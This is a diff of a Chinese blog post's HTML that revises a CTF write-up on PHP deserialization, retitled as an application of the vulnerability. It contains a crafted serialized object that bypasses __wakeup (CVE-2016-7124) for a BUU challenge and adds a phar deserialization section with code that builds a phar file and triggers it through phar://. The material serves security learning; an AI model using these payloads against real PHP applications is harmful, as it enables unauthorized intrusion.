@@ -83,15 +83,16 @@
 
 <meta name="description" content="前言同样是buu，同样是极客大挑战，这次遇到了一题有关于php反序列化漏洞，遇到新东西总是要开博客记录的嘛。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php的序列化与反序列化">
-<meta property="og:url" content="http://example.com/2021/11/01/php%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:title" content="php反序列化漏洞应用">
+<meta property="og:url" content="http://example.com/2021/11/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%BA%94%E7%94%A8/index.html">
 <meta property="og:site_name" content="mrl64&#39;s Blog">
 <meta property="og:description" content="前言同样是buu，同样是极客大挑战，这次遇到了一题有关于php反序列化漏洞，遇到新东西总是要开博客记录的嘛。">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2021/11/01/FdIPnND9ig38HaE.png">
 <meta property="og:image" content="https://i.loli.net/2021/11/01/wZpndhTWgOHKRlC.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/02/JwWPO3D4reqBZUb.png">
 <meta property="article:published_time" content="2021-11-01T10:07:52.000Z">
-<meta property="article:modified_time" content="2021-11-01T13:10:58.046Z">
+<meta property="article:modified_time" content="2021-11-02T11:42:12.413Z">
 <meta property="article:author" content="liszt_lin">
 <meta property="article:tag" content="-web前端 -php">
 <meta name="twitter:card" content="summary">
@@ -125,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/2021/11/01/php的序列化与反序列化/"/>
+  <link rel="canonical" href="http://example.com/2021/11/01/php反序列化漏洞应用/"/>
 
 
 
 
 
-  <title>php的序列化与反序列化 | mrl64's Blog</title>
+  <title>php反序列化漏洞应用 | mrl64's Blog</title>
   
 
 
@@ -268,7 +269,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/php%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%BA%94%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -285,7 +286,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">php的序列化与反序列化</h1>
+          <h1 class="post-title" itemprop="name headline">php反序列化漏洞应用</h1>
         
 
         <div class="post-meta">
@@ -377,17 +378,37 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
 <p>将Name后的2改为3（大一点也行），再输入进select中获取flag：<br><img src="https://i.loli.net/2021/11/01/wZpndhTWgOHKRlC.png"></p>
 <p>解毕</p>
-<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>序列化是将变量或对象转换成字符串的过程，而反序列化是将字符串转化为变量或对象的过程。一般在php中常用的序列化与反序列化方式有：<br><code>serialize，unserialize；json_encode，json_decode</code><br>一般在ctf中前者的使用更多。下面这篇博客中详细剖析了PHP序列化与反序列化，想要详细学习可以参考，本篇博客不做详细的介绍。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/youyoui/p/8610068.html">深度剖析PHP序列化和反序列化</a></p>
+<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>序列化是将变量或对象转换成字符串的过程，而反序列化是将字符串转化为变量或对象的过程，序列化与反序列化主要是为了方便对象的传输。一般在php中常用的序列化与反序列化方式有：<br><code>serialize，unserialize；json_encode，json_decode</code><br>一般在ctf中前者的使用更多。</p>
+<p>这里介绍php序列化和反序列化基本类型表达：</p>
+<ul>
+<li>布尔型：b:value =&gt; b:0</li>
+<li>整数型：i:value =&gt; i:1</li>
+<li>字符串型：s:length:value =&gt;s:4 “aaaa”</li>
+<li>数组型：a:<length>:{key, value pairs} =&gt;a:1:{i:1;s:1 “a”}</li>
+<li>对象型：O:<class_name_length></li>
+<li>NULL型：N</li>
+</ul>
+<p>下面这篇博客中详细剖析了PHP序列化与反序列化，想要详细学习可以参考，本篇博客不做详细的介绍。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/youyoui/p/8610068.html">深度剖析PHP序列化和反序列化</a></p>
 <h1 id="反序列化漏洞的利用（随时更新）"><a href="#反序列化漏洞的利用（随时更新）" class="headerlink" title="反序列化漏洞的利用（随时更新）"></a>反序列化漏洞的利用（随时更新）</h1><p>利用这个漏洞有两个条件：</p>
 <ul>
 <li>unserialize()函数的参数是可控的</li>
-<li>php中有可利用的类并且类中含有魔术函数</li>
+<li>php中有可利用的类并且类中含有魔术方法</li>
+<li>魔术方法中存在任意代码执行的eval</li>
 </ul>
-<p>然后再介绍一批魔术函数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_construct()：创建对象时初始化</span><br><span class="line">_destruction()：结束时销毁对象</span><br><span class="line">_toString()：对象被当作字符串时使用</span><br><span class="line">_sleep()：序列化对象之前调用</span><br><span class="line">_wakeup()：反序列化之前调用</span><br><span class="line">_call()：调用对象不存在时使用</span><br><span class="line">_get()：调用私有属性时使用</span><br></pre></td></tr></table></figure>
+<p>然后再介绍一批魔术方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__construct()：创建对象时初始化</span><br><span class="line">__destruct()：结束时销毁对象</span><br><span class="line">__toString()：对象被当作字符串时使用</span><br><span class="line">__sleep()：序列化对象之前调用</span><br><span class="line">__wakeup()：反序列化之前调用</span><br><span class="line">__call()：调用对象不存在时使用</span><br><span class="line">__get()：调用私有属性时使用</span><br></pre></td></tr></table></figure>
 
 <p>由此我们可以看出，当传给反序列化函数的参数可控时，我们可以传入一个序列化字符串从而控制对象内部的变量甚至函数。那么我们来详细介绍几个常见的反序列化漏洞的应用。</p>
 <h2 id="CVE-2016-7124（-wakeup-绕过）"><a href="#CVE-2016-7124（-wakeup-绕过）" class="headerlink" title="CVE-2016-7124（_wakeup()绕过）"></a>CVE-2016-7124（_wakeup()绕过）</h2><p>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，也就是上面的例题中我们使用的绕过方法，这里不再赘述。</p>
+<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都被储存在phar文件内容描述着部分中。而这个部分还会以序列化形式存储用户自定义的meta-data，这是攻击的核心部分。</p>
+<p>phar归档文件有三种格式：tar归档、zip归档和phar归档。phar格式的文件允许我们完全控制文件的起始部分，而最小的标志（stub）可以作为任意数据的前缀，也是phar文件中的第一项。因此我们可以伪造文件头来绕过对文件格式的检测，我们可以构造一个既是合法jpeg文件又是一个合法的phar文件。</p>
+<p>要生成phar文件，我们首先要修改php.ini中phar.readonly的选项，删去前面的分号，并将On改为Off。接着我们生成phar文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Test&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置Stub</span><br><span class="line">    $o = new Test();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>用010打开文件就会发现序列化对象已被存入了phar文件当中。</p>
+<p>而phar的攻击面是很广泛的，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，以下函数都受到了影响：<br><img src="https://i.loli.net/2021/11/02/JwWPO3D4reqBZUb.png"></p>
+<p>那么这里我们就可以编写程序进行反序列化漏洞的攻击了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;i&#x27;m ok&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file = &#x27;phar://phar.phar/test.txt&#x27;;</span><br><span class="line">file_get_contents($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>最后我们发现触发成功。</p>
 <h2 id="others-wait-to-update"><a href="#others-wait-to-update" class="headerlink" title="others wait to update"></a>others wait to update</h2><p>由于查阅了其他人写的博客发现这里面的水很深，因此在以后每碰到一种新的方式都会在这前面进行更新。</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>刷buu发现还有很多的新知识等待掌握，刷题还是很有效果的。</p>
 
@@ -567,7 +588,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="nav-number"></span> <span class="nav-text">[极客大挑战 2019]PHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number"></span> <span class="nav-text">序列化与反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%88%E9%9A%8F%E6%97%B6%E6%9B%B4%E6%96%B0%EF%BC%89"><span class="nav-number"></span> <span class="nav-text">反序列化漏洞的利用（随时更新）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-7124%EF%BC%88-wakeup-%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">CVE-2016-7124（_wakeup()绕过）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#others-wait-to-update"><span class="nav-number">2.</span> <span class="nav-text">others wait to update</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="nav-number"></span> <span class="nav-text">[极客大挑战 2019]PHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number"></span> <span class="nav-text">序列化与反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%88%E9%9A%8F%E6%97%B6%E6%9B%B4%E6%96%B0%EF%BC%89"><span class="nav-number"></span> <span class="nav-text">反序列化漏洞的利用（随时更新）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-7124%EF%BC%88-wakeup-%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">CVE-2016-7124（_wakeup()绕过）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.</span> <span class="nav-text">phar反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#others-wait-to-update"><span class="nav-number">3.</span> <span class="nav-text">others wait to update</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
             
 
           </div>
